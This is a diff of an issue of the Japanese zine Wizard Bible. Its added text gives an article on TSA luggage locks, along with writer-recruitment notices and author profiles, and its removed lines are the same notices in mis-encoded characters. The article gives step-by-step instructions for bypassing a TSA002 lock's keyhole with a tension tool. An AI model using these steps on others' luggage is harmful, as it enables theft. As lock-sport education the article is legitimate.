+とも簡単なバイパス解錠について紹介します。
+
+
+■0x02.) TSAロックの概要
+
+　TSAロックとはアメリカ運輸保安局 TSA（Transportation Security Administr
+ation）によって認可・容認された錠前です。近年のTSAロックは文字合わせ錠の
+タイプのものが普及しています（図1参照）。
+
+（図2：http://wizardbible.org/62/img/TSA_lock.jpg）TSAロック付きダイヤル錠
+
+　アメリカ同時多発テロの後、爆破物や危険物の検査のためにアメリカ国内のす
+べての空港において、アメリカへの出入国とアメリカ国内のフライトに際して、
+厳重なセキュリティチェックが行われています。特に空港に預ける荷物に関して
+は、持ち主がいない場所でもTSA職員によってバッグやスーツケースの中を検査し
+ています。もしスーツケース等の錠前が施錠された状態の場合には、職員が破錠
+してから検査します。こうした破壊行為が原因によって内容物が破壊したり紛失
+したりしても、TSA職員は一切責任を負わなくてもよいと国によって取り決められ
+ています。そのため、荷物を預けるタイミングで施錠をしないように促されます。
+これはアメリカ本土だけでなく、ハワイ、グアム、アラスカ、サイパン、その他
+のアメリカ領のエリアの旅行の際も同様です。
+
+　しかし、錠前の施錠をしないということはTSA職員以外にも中身を開けられてし
+まう恐れがあります。
+　TSAロックはこうした不安を解消します。TSAロックは特別にTSAからの認可を受
+けており、TSAロックが付いている錠前であれば、施錠したまま空港の検査に出し
+てもよいことになっています。空港のTSA職員はTSAロックの鍵を所有しており、
+TSAロックを施解錠できます。この鍵は一般向けには販売されていないため、TSA
+職員以外にとっては鍵開けの技術を駆使する以外に開錠する術はありません。
+
+●TSAロックが付属していないスーツケース
+
+　TSAロックが付属していないスーツケース向けに、TSAロック付属のダイヤル式
+南京錠やスーツケースベルトが販売されています。
+○TSAロック付属のダイヤル式南京錠
+
+　シャックルを2つのファスナーの穴に通して、ファスナーを開けることを防ぎま
+す。TSAロックの鍵穴は底面に存在します。古いタイプでは、ピンタンブラー錠タ
+イプのTSAロックも存在します。
+
+○TSAロック付属のスーツケースベルト
+
+　施錠するとベルトが固定され、解錠するとベルトを緩めることができます。取
+っ手の部分をベルトを通してロックを掛けることで、スーツケースベルトをずら
+して外すことを防ぐことができます。
+
+　ファスナーで開けるタイプの場合、ベルトを施錠したままでも手探りで中の物
+品を奪うことができます。一方、硬い蓋を開けるタイプの場合、この種のスーツ
+ケースベルトで固定されていると、ベルトのTSAロックを解錠するか、ベルトを切
+断するかしなければ、中の物品は奪われません。ベルトは刃物で簡単に切断する
+ことができますが、切断されてしまえば盗難にあったことを検知できます。
+
+●TSAロック以外の錠前で施錠したままだとどうなるか
+
+　ところで、「TSAロックを開ける係員が不在で、スーツケースごと壊されること
+があるため、スーツケースの鍵はかけずTSAロック付きスーツケースベルトをかけ
+るように」といわれることもあるようです。万が一TSA職員に破錠される場合でも、
+TSAロック付きスーツケースベルトであれば、ベルトの切断だけの被害で済み、ス
+ーツケースが備えている錠前を破壊されることがありません。スーツケースが備
+えている錠前を交換しようとしても、メーカーに問い合わせする手間が生じ、最
+悪の場合は対応する部品の在庫が残っておらず交換することさえできません。
+
+
+■0x03.) TSAロックのバイパス解錠
+
+　TSAロックの鍵穴の近くに「TSA00x」のように刻印されていますが、この数値ご
+とにTSAロックの鍵の形状・大きさが異なります。国内ではTSA007やTSA002をよく
+見かけることができます。本稿ではTSA002の解錠方法を紹介します
+
+●TSA002
+
+　TSA002は使用者は3桁の数字の組み合わせ錠で施解錠し、TSA職員は鍵で施解錠
+するタイプです（図2参照）。
+
+（図2：http://wizardbible.org/62/img/TSA002_3.jpg）TSA002の外観
+
+　暗証番号は側面に揃えます（図3参照）。
+
+（図3：http://wizardbible.org/62/img/TSA002_10.jpg）TSA002の側面
+
+　暗証番号をセットするとシャックルを引くことができ、解錠します。施錠時に
+はシャックルを戻した状態で番号をずらします。
+
+●TSA002の暗証番号の変更
+
+　デフォルトの暗証番号は000ですが、任意の番号に変更できます。
+　暗証番号をセットしてシャックルを解錠状態にします。シャックルを引っ張る
+と、根元の突起が見えます。シャックルの軸を中心にして先端を90度回転して、
+突起を90度先の切り欠きに入れます（図4参照）。
+
+（図4：http://wizardbible.org/62/img/TSA002_11.jpg）暗証番号の変更時の突
+起の位置
+
+　シャックルを上から押した状態で、ダイヤルを回して数値を変更します。目的
+の暗証番号にセットしたら、シャックルを上から押さえないようにします。これ
+で暗証番号が変更されます。
+
+●TSA002のバイパス解錠
+
+　TSA002のTSAロック部の鍵穴は次のような形状になっています（図5参照）。
+
+（図5：http://wizardbible.org/62/img/TSA002_1.jpg）TSA002の鍵穴の形状
+
+　この鍵穴は通常TSA職員しか使用しません。TSAロックのマスターキーを挿入す
+ることで、暗証番号をセットすることなく、解錠することができます。本稿の目
+的はマスターキー以外のものを挿入し、TSAロックを解錠してしまうことです。
+ちょっとした道具さえあれば、次の手順で誰でも解錠できます。
+
+　TSA002は次の手順でバイパス解錠できます。
+
+1：ディンプル錠のピッキングに使用するテンションを用意します（図6参照）。
+
+（図6：http://wizardbible.org/62/img/TSA002_2.jpg）解錠対象のTSA002と解錠
+に使用するテンション
+
+　このテンションが用意できない場合は、比較的厚みのあるLテンションなどで代
+用できます。厚みを要求するのはひねりの動作が入るためです。
+　ただし、内筒の前面の鍵穴の形状は長方形ですが、内部に突起があるため、そ
+の突起を避けることができる厚みのものしか挿入できません。
+
+2：テンションの幅の小さい方をTSAロックの鍵穴に挿入します（図7参照）。
+
+（図7：http://wizardbible.org/62/img/TSA002_4.jpg）テンションの挿入
+
+3：奥まで挿入すると弾力があります。弾力を押し返したまま、全体を下（あるい
+は上）に移動すると、解錠方向に回転します（図8参照）。
+
+（図8：http://wizardbible.org/62/img/TSA002_5.jpg）テンションの操作
+
+4：内筒が90度回転し、TAS002という文字に対して、鍵穴が横になれば解錠の成功
+です（図9参照）。
+
+（図9：http://wizardbible.org/62/img/TSA002_6.jpg）解錠成功
+
+　TSAロックを解錠しても、シャックルの先端は上がりません。それにもかかわら
+ず、解錠状態になるのは、シャックルの先端に秘密があります。
+　シャックルの先端がセットされている部分の周囲に赤いウォードと金属のウォ
+ードがあります。赤いウォードは2箇所に切り欠きがある円柱状の障害物です。ま
+た、その内側にある金属のウォードは1箇所に切り欠きがある円柱状の障害物です。
+　TSAロックを施解錠すると、金属のウォードが90度回転します。TSAロックの解
+錠時には赤色のウォードの切り欠きと金属のウォードの金属の切り欠きが揃い、
+シャックルの軸を中心にして回転することで、解錠状態になります（図10、図11
+参照）。
+
+（図10：http://wizardbible.org/62/img/TSA002_7.jpg）ウォードの切り欠きが揃ったところ
+（図11：http://wizardbible.org/62/img/TSA002_8.jpg）TSAロックの解錠状態
+
+　逆に、TSAロックの施錠時には赤色のウォードの切り欠きと金属のウォードの金
+属の切り欠きが揃わないので、シャックルの先端がウォードに引っ掛かるわけで
+す。つまり、シャックルの先端が元の位置にあれば施錠状態になるわけです（図
+12参照）。
+
+（図12：http://wizardbible.org/62/img/TSA002_9.jpg）TSAロックの施錠状態
+
+
+■0x04.) 終わりに
+
+　今回紹介したバイパス解錠は非常に簡単でした。他のTSA001や一部のTSA007は
+これほど簡単にうまくいきません。ピッキングツールやマスターキーの複製など
+が有効です。詳細は出版予定の錠前の本で紹介します。
+
+
 
 x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
 x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
 
-��Wizard Bible�ihttp://wizardbible.org/�j�ł͐����A���M���C�^�[���W����
-���܂��B
-�@�������e�̃e�[�}�͍L�`�ł́uunder ground�v�ł��B�Ⴆ�΃n�b�L���O��Z�L
-�����e�B����s�b�L���O�Ȃǂƕ��L�����e���l���Ă��܂��B�܂�����ȐE�Ƃ��
-���̉���Ȃǂł��\���܂���B
-�@��񂫂�ł��\���܂���B�܂��K������A�ڂ���`��������܂���̂ŁA�ł�
-��͈͂ō\���܂���B�C�y�ɐ��������Ă��������B
+ --- 第4章: お知らせ ---
 
-��Kenji Aiko����Q&A������Ă���܂����B���߂ĎQ������l�ł��킩��₷��
-������Ă��܂��̂ŁA�Q�l�ɂ��Ă��������B
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+○Wizard Bible（http://wizardbible.org/）では随時、執筆ライターを募集して
+います。
+　扱う内容のテーマは広義での「under ground」です。例えばハッキングやセキ
+ュリティからピッキングなどと幅広い内容を考えています。また特殊な職業や趣
+味の解説などでも構いません。
+　一回きりでも構いません。また必ず毎回連載する義務もありませんので、でき
+る範囲で構いません。気軽に声をかけてください。
+
+○Kenji AikoさんがQ&Aを作ってくれました。初めて参加する人でもわかりやすく
+書かれていますので、参考にしてください。
 
 http://wizardbible.org/wbQandA.html
 
-��Wizard Bible�ɎQ����]�̕��͋C�y�Ƀ��[���iipusiron@gmail.com�j���������B
+○Wizard Bibleに参加希望の方は気軽にメール（ipusiron@gmail.com）ください。
 
 
 
 x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
 x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
 
-  --- ��5��: ���҃v���t�B�[�� ---
+  --- 第5章: 著者プロフィール ---
 
 x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
 x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
 
 
-��Lyc0ris
-��Job: Student
-��Web: http://lyc0ris.webcrow.jp/
-��Twitter: @lyc0ris_sec
-��Mail: lyc0ris.hacker@gmail.com
-��Comment:
-�@�܂��܂��삯�o���ł����X�����ł�:)
+■Lyc0ris
+●Job: Student
+●Web: http://lyc0ris.webcrow.jp/
+●Twitter: @lyc0ris_sec
+●Mail: lyc0ris.hacker@gmail.com
+●Comment:
+　まだまだ駆け出しですが宜しくです:)
 
 
-�����ь�
-��Job: ����x����
-��Web: http://ruffnex.oc.to/kuroringo/kuroringo/me.html
-��Web2: http://www.packr.org/
-��Twitter: @r00tapple
-��Mail: packr@packr.org
-��Comment:
-�@����́A�}���E�F�A�̕⏕�I�Ȃ��b�ɂȂ�܂����B
-�@IoT�Ɋւ���n�b�L���O���f�f�Ǝ҂�������Ȃ�IoT�ɑ΂���Z�L�����e�B����
-���`�ɂȂ��Ă����l�ȋC�����܂��B
+■黒林檎
+●Job: 自宅警備員
+●Web: http://ruffnex.oc.to/kuroringo/kuroringo/me.html
+●Web2: http://www.packr.org/
+●Twitter: @r00tapple
+●Mail: packr@packr.org
+●Comment:
+　今回は、マルウェアの補助的なお話になりました。
+　IoTに関するハッキングも診断業者が増えるなどIoTに対するセキュリティ事業
+も形になってきた様な気がします。
 
 
-��IPUSIRON
-��Job: ����x����
-��Web: http://akademeia.info
-��Twitter: @ipusiron
-��Mail: ipusiron@gmail.com
-��Comment:
-�@�F�l�̂������ɂ��A�uIT�G���W�j�A�{���2016�v�Z�p�������3�^�C�g����
-�w�n�b�J�[�̊w�Z�x���I�΂�܂����B���̌�A�f�u�T�~2016�̃v���[�����ɎQ
-�����A�uIT�G���W�j�A�{���2016�v�̓��ʏ܂𒸂��܂����B�ڍׂ́w�n�b�J�[��
-�w�Z�x�����T�C�g�̃g�b�v�y�[�W�ɋL�ڂ��܂����̂ŁA���m�F���������B
+■IPUSIRON
+●Job: 自宅警備員
+●Web: http://akademeia.info
+●Twitter: @ipusiron
+●Mail: ipusiron@gmail.com
+●Comment:
+　皆様のおかげにより、「ITエンジニア本大賞2016」技術書部門の3タイトルに
+『ハッカーの学校』が選ばれました。その後、デブサミ2016のプレゼン大会に参
+加し、「ITエンジニア本大賞2016」の特別賞を頂きました。詳細は『ハッカーの
+学校』公式サイトのトップページに記載しましたので、ご確認ください。
 http://s-akademeia.sakura.ne.jp/main/books/school/
-�@�܂��A�܂ڂ낵������ɂāAGW�ɕ����ՃC�x���g���J�Â���܂��B������Secu
-rity Akademeia�����炩�̍Â���������\��ł��B�ڍׂ́ASecurity Akademeia
-�̃g�b�v�y�[�W�̂��m�点�����m�F���������B
+　また、まぼろし博覧会にて、GWに文化祭イベントが開催されます。そこでSecu
+rity Akademeiaも何らかの催し物をする予定です。詳細は、Security Akademeia
+のトップページのお知らせをご確認ください。
 http://data-house.sblo.jp/
 
